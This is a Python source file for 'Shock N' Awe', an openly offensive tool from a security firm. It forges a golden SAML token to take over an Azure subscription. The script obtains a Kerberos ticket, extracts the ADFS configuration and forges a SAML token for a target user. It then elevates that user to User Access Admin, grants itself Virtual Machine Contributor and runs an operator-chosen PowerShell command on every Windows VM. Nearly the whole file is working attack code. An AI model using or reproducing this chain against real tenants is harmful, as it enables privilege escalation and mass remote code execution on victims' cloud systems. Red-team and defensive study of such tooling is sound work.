#!/usr/bin/env python3

# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import jwt
import signal
import random
import asyncio
import logging
import argparse
import requests
import concurrent.futures
import concurrent.futures.thread
from uuid import uuid4
from time import sleep
from typing import Dict
from functools import partial
from ticketsplease.modules.ticket import create_ticket  # type: ignore
from ticketsplease.modules.adfs import get_configuration  # type: ignore
from ticketsplease.modules.saml import generate_golden_saml  # type: ignore
from ticketsplease.modules.azure import request_access_token  # type: ignore

__version__ = "0.1.0"


def signal_handler(signal, frame):
    """Signal handler for async routines.
    Call the module's shutdown function to cleanly exit upon
    receiving a CTRL-C signal.
    """
    sna.shutdown(key=True)
    sys.exit(0)


def get_args():
    """Parse command line args"""
    p = argparse.ArgumentParser(
        description=f"Shock N' Awe: Deploy a Payload to an Azure Subscription | v{__version__}"
    )
    p.add_argument(
        "--target-user",
        type=str,
        help="Target Cloud User username",
        required=True,
    )
    p.add_argument(
        "--domain",
        type=str,
        help="Target Domain",
        required=True,
    )
    p.add_argument(
        "--adfs-host",
        type=str,
        help="Target ADFS Server",
        required=True,
    )
    p.add_argument(
        "--dc-ip",
        type=str,
        help="Target Domain Controller",
        required=True,
    )
    p.add_argument(
        "--domain-username",
        type=str,
        help="Domain Username for DCSync/LDAP operations",
        required=True,
    )
    p.add_argument(
        "--domain-password",
        type=str,
        help="Password for Domain Username for DCSync/LDAP operations",
        required=True,
    )
    p.add_argument(
        "--adfs-account",
        type=str,
        help="ADFS Service Account Name or Local Admin Account Name of the ADFS Server",
	required=True,
    )
    p.add_argument(
        "--rate",
        type=int,
        default=5,
        help="Number of threads to run concurrently. Default: 5",
    )
    p.add_argument(
        "--command",
        type=str,
        help="Command to be run on the victim system(s)",
        required=True,
    )
    p.add_argument("--debug", action="store_true", help="Enable debugging")
    return p.parse_args()


class ShockNAwe:
    def __init__(
        self,
        loop: asyncio.AbstractEventLoop,
        access_token: str,
        rate: int = 5,
    ):
        self.loop = loop
        self.access_token = access_token
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=rate)
        # On init:
        # Elevater user to User Access Admin
        self._elevate_to_user_access_admin()
        # Get Subscription ID
        self._get_subscription_id()
        # Get Role ID for Virtual Machine Contributor
        self._get_role_assignment_id()
        # Grant Virtual Machine Contributor role to user
        self._grant_virtual_machine_contributor_role()
        # Enumerate VMs in Subscription
        self._get_vms()

    def shutdown(self, key: bool = False):
        """Perform a shutdown and clean up of the asynchronous handler"""
        if key:
            logging.warning("CTRL-C caught")

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit

        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait: None

    def _elevate_to_user_access_admin(self) -> str:
        """Elevate Global Admin to User Access Admin"""
        logging.info("[ * ] Elevating Global Admin to User Access Admin")

        url = "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2015-07-01"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        data = requests.post(url, headers=headers)
        logging.info(f"\tUser Elevated!")

    def _get_subscription_id(self) -> str:
        """Retrieve an Azure subscription ID"""
        logging.info("[ * ] Extracting Azure subscription ID")

        url = "https://management.azure.com/subscriptions?api-version=2016-06-01"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        data = requests.get(url, headers=headers).json()

        # Grab the first subscription ID
        subscription_id = data["value"][0]["subscriptionId"]

        logging.info(f"\tAzure Subscription ID: {subscription_id}")
        self.subscription_id = subscription_id

    def _get_role_assignment_id(self) -> str:
        """Get Role Assigmnet ID of Virtual Contributor Role"""
        logging.info("[ * ] Obtaining Assignment Role ID for Virtual Machine Contributor Role")

        url = f"https://management.azure.com/subscriptions/{self.subscription_id}/providers/Microsoft.Authorization/roleDefinitions?$filter=roleName eq 'Virtual Machine Contributor'&api-version=2018-01-01-preview"
        headers = {"Authorization":f"Bearer {self.access_token}"}
        data = requests.get(url, headers=headers).json()
        self.role_id = data['value'][0]['name']
        logging.info(f"\tVirtual Machine Contributor Role ID: {self.role_id}")

    def _grant_virtual_machine_contributor_role(self) -> str:
        logging.info("[ * ] Granting Ourselves Virtual Machine Contributor Permissions")

        url = f"https://management.azure.com/subscriptions/{self.subscription_id}/providers/Microsoft.Authorization/roleAssignments/{str(uuid4())}?api-version=2018-09-01-preview"
        headers = {"Authorization": f"Bearer {self.access_token}", "Content-Type": "application/json"}
        decoded_token = jwt.decode(self.access_token, options = {"verify_signature":False})
        user_id = decoded_token['oid']
        body = {
          "properties": {
            "roleDefinitionId": f"/subscriptions/{self.subscription_id}/providers/Microsoft.Authorization/roleDefinitions/{self.role_id}",
            "principalId": f"{user_id}",
            "canDelegate": "false"
          }
        }
        response = requests.put(url, headers=headers, json=body).json()

        logging.info(f"\tResponse: {response}")

    def _get_vms(self) -> Dict:
        """Enumerate VMs in an Azure subscription"""
        logging.info("[ * ] Enumerating virtual machines in subscription")

        url = f"https://management.azure.com/subscriptions/{self.subscription_id}/providers/Microsoft.Compute/virtualMachines?api-version=2019-12-01"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        data = requests.get(url, headers=headers).json()

        # Build data structure
        vms = {
            count: {
                "ResourceGroup": [],
                "Name": [],
                "Location": [],
                "Id": [],
                "ComputerName": [],
                "AdminUsername": [],
                "VMSize": [],
                "OS": [],
            }
            for count in range(len(data["value"]))
        }

        # Fill in data
        for count, value in enumerate(data["value"]):
            vms[count]["ResourceGroup"].append(value["id"].split("/")[4])
            vms[count]["Name"].append(value["name"])
            vms[count]["Location"].append(value["location"])
            vms[count]["Id"].append(value["properties"]["vmId"])
            vms[count]["ComputerName"].append(
                value["properties"]["osProfile"]["computerName"]
            )
            vms[count]["AdminUsername"].append(
                value["properties"]["osProfile"]["adminUsername"]
            )
            vms[count]["VMSize"].append(
                value["properties"]["hardwareProfile"]["vmSize"]
            )
            try:
                if value["properties"]["osProfile"]["windowsConfiguration"]:
                    vms[count]["OS"].append("Windows")
            except:
                vms[count]["OS"].append("Linux")

        logging.info(f"\tVirtual machine count: {len(vms)}")
        self.vms = vms

    def _execute_vm(
        self,
        resource_group: str,
        server: str,
        command: str,
        vm_type: str,
    ) -> bool:
        """Execute a given command on a target VM in an Azure subscription"""
        url = f"https://management.azure.com/subscriptions/{self.subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Compute/virtualMachines/{server}/runCommand?api-version=2018-04-01"
        headers = {
            "Authorization": f"Bearer {self.access_token}",
            "x-ms-command-name": "Microsoft_Azure_Automation",
            "Content-Type": "application/json; charset=utf-8",
        }

        logging.info(f"[ * ] Attacking:")
        logging.info(f"\tServer:           {server}")
        logging.info(f"\tResource Group:   {resource_group}")
        logging.info(f"\tOperating System: {vm_type}")

        if vm_type == "Windows":
            script_type = "Power"
        else:
            logging.warning("[ ! ] Operating System is Linux. Skipping this target.")
            return None

        body = {"commandId": f"Run{script_type}ShellScript", "script": command}

        response = requests.post(url, headers=headers, json=body)
        try:
            data = response.json()
            if (
                data["error"]["message"]
                == "The operation requires the VM to be running (or set to run)."
            ):
                logging.warning(f"[ ! ] {server} - Status: Server is not running")
                return None
            elif (
                data['error']['message']
            ):
                logging.warning(f"[ ! ] {server} - {data['error']['message']}")
                return None
        except:
            # Perform status checks on the payload deployment
            async_response = response.headers["Azure-AsyncOperation"]
            count = 0
            while True:
                r = requests.get(async_response, headers=headers)
                try:
                    r = r.json()
                    if r["status"] == "InProgress":
                        logging.info(f"\t{server} - Status: In Progress")
                        count += 1
                        if count >= 10:
                            logging.warning(
                                f"[ ! ] {server}: Script Execution is taking too long, moving onto the next target"
                            )
                            return None
                        sleep(round(random.uniform(5, 10), 2))
                        continue
                    elif r["status"] == "Succeeded":
                        logging.info("[ + ] Payload deployed successfully")
                        logging.info(
                            f"[ + ] {server} Output:\n{r['properties']['output']['value'][0]['message']}"
                        )
                        return True
                    elif r["status"] == "Failed":
                        logging.warning(f"[ ! ] {server} - Status: Failed")
                        return None
                    else:
                        logging.debug(r)
                        return None
                except Exception as e:
                    logging.error(f"[ ! ] {server} - Status: Exception Error\n{e}")
                    logging.debug(f"{r.status_code}")
                    logging.debug(f"{r.headers}")
                    logging.debug(f"{r.text}")
                    return None

    async def execute_vms(self, command: str):
        """Asyncronously execute task(s)"""
        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor,
                partial(
                    self._execute_vm,
                    resource_group,
                    server,
                    command,
                    vm_type,
                ),
            )
            for k in self.vms.keys()
            for resource_group, server, vm_type in zip(
                self.vms[k]["ResourceGroup"], self.vms[k]["Name"], self.vms[k]["OS"]
            )
        ]

        if blocking_tasks:
            await asyncio.wait(blocking_tasks)


if __name__ == "__main__":
    args = get_args()

    # Initialize logging level and format
    if args.debug:
        logging_level = logging.DEBUG
        logging_format = (
            "[%(asctime)s] %(levelname)-5s - %(filename)17s:%(lineno)-4s - %(message)s"
        )
    else:
        logging_level = logging.INFO
        logging_format = "[%(asctime)s] %(levelname)-5s: %(message)s"

    logging.basicConfig(format=logging_format, level=logging_level)
    logging.addLevelName(logging.WARNING, "WARN")

    # First, create a Kerberos ticket
    # We are generating a Kerberos ticket for the domain
    # user to authenticate and pull down the ADFS config
    # settings. Since we have the domain username and
    # password, we pass them as the target user values
    # and the ticket module will use LDAP to query for
    # the SID to create the ticket.
    (krb_ticket, cipher, sessionKey) = create_ticket(
        domain=args.domain,
        host=args.adfs_host,
        user=args.adfs_account,
        domain_username=args.domain_username,
        domain_password=args.domain_password,
        dc_ip=args.dc_ip,
        ap_req=True,
    )

    # Next, use the Kerberos ticket to authenticate and extract the ADFS
    # config remotely
    configuration = get_configuration(
        adfs_host=args.adfs_host,
        ticket=krb_ticket,
        sessionKey=sessionKey,
        cipher=cipher,
    )

    # Finally, use the ADFS config to generate the SAML token
    saml_token = generate_golden_saml(
        adfs_config=configuration,
        domain=args.domain,
        target_user=args.target_user,
        domain_username=args.domain_username,
        domain_password=args.domain_password,
        dc_ip=args.dc_ip,
        assertion=True,
    )

    (access_token, refresh_token) = request_access_token(
        api="azure_core_mgmt",
        saml_token=saml_token,
    )

    # == Attack

    # Note: This is a quick fix for the missing loop in MainThread error
    # TODO: Handle ctrl-c properly so that the loop actually exits correctly
    #       as right now - SIGINT needs to trigger twice to force exit
    base_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(base_loop)
    loop = asyncio.get_event_loop()

    # Add signal handler to handle ctrl-c interrupts
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    sna = ShockNAwe(
        loop=loop,
        access_token=access_token,
        rate=args.rate,
    )

    command = args.command.split(",")

    logging.info(
        f"[ * ] Running command '{' '.join(command)}' on all VM's in the Azure subcription"
    )
    loop.run_until_complete(sna.execute_vms(command))

    sna.shutdown()

    loop.run_until_complete(asyncio.sleep(0.250))
    loop.close()
